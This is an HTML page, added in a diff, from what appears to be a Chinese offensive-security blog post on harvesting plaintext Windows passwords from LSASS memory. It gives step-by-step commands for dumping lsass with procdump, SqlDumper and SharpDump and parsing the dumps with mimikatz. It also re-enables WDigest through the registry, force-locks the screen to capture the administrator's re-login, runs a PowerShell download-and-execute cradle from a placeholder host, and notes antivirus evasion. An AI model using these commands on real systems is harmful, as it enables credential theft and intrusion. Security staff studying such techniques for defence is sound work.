@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Mimikatz明文密码抓取 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="Mimikatz明文密码抓取 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">Mimikatz明文密码抓取</h1><div class="post-time">Jul 20, 2019</div><div class="post-content"><h2><span id="mimikatz">mimikatz</span></h2><h3><span id="procdumpmimikatz">procdump+mimikatz</span></h3><p><strong>KB2871997</strong></p>
+<p>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。</p>
+<p>当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p>
+<p>以下是支持的系统:</p>
+<ul>
+<li>Windows 7</li>
+<li>Windows 8</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012R 2</li>
+</ul>
+<p>原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码</p>
+<p>利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
+<p>抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p>
+<p>procdump64.exe导出lsass.dmp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+<p>使用本地的mimikatz.exe读取lsass.dmp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_1.png" alt="mimi_1"></p>
+<p>无法读取到密码。</p>
+<p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
+<p><strong>开启Wdigest Auth</strong></p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>关闭Wdigest Auth</strong></p>
+<p>关闭命令如下：</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>强制锁屏</strong></p>
+<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
+<p>强制锁屏，让管理员重新登录。</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation </span><br><span class="line">&#123;</span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://x.x.x.x/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure>
+<p>重新读取，可读到明文密码。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_2.png" alt="mimi_2"></p>
+<h3><span id="sqldumper-mimikatz">SqlDumper + mimikatz</span></h3><p>SqlDumper.exe是从SQL Server安装目录下提取出来的，<strong>功能和Procdump相似，</strong>并且也是微软出品的，体积远小于Procdump，也具备一定的免杀功能。SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本，<strong>参考如下：</strong></p>
+<p>140 for SQL Server 2017</p>
+<p>130 for SQL Server 2016</p>
+<p>120 for SQL Server 2014</p>
+<p>110 for SQL Server 2012</p>
+<p>100 for SQL Server 2008</p>
+<p>90 for SQL Server 2005</p>
+<p>如果目标机器没有安装SQL Server，可以自己上传一个SqlDumper.exe。</p>
+<p><strong>用法：</strong></p>
+<p><strong>1.查看lsass.exe 的ProcessID</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc |findstr lsass.exe</span><br></pre></td></tr></table></figure>
+<p><strong>2.导出dump文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe ProcessID 0 0x01100</span><br></pre></td></tr></table></figure>
+<p><strong>3.mimikatz加载dump文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<h3><span id="sharpdump-mimikatz">SharpDump+ mimikatz</span></h3><p>项目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GhostPack/SharpDump</span><br></pre></td></tr></table></figure>
+<p>编译生成的exe文件只有10KB左右，而且可过360。</p>
+<p><strong>用法：</strong></p>
+<p><strong>1.在管理员权限下运行生成debug480.bin</strong></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_5.png" alt="mimi_5"></p>
+<p>修改debug480.bin为zip文件解压得到导出文件。</p>
+<p><strong>mimikatz加载dump文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump debug480&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_6.png" alt="mimi_6"></p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/uncategorized/权限维持-注册表.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
